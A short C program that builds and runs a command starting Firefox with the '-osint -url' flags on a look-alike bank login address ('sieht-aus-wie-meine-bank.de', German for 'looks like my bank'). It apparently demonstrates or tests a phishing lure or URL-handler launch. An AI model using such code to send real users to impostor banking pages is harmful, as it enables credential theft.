#include "helpers.h"
#include <stdio.h>
#include <stdlib.h>


int main() {
    const size_t bufferLen = 300;
    char firefoxPath[bufferLen];
    char *programFilesPath = getenv("ProgramFiles");
    snprintf(firefoxPath, bufferLen, "\"%s\\Mozilla Firefox\\firefox.exe\" -osint -url \"https://www.sieht-aus-wie-meine-bank.de/login\"", programFilesPath);
    return run_command(firefoxPath);
}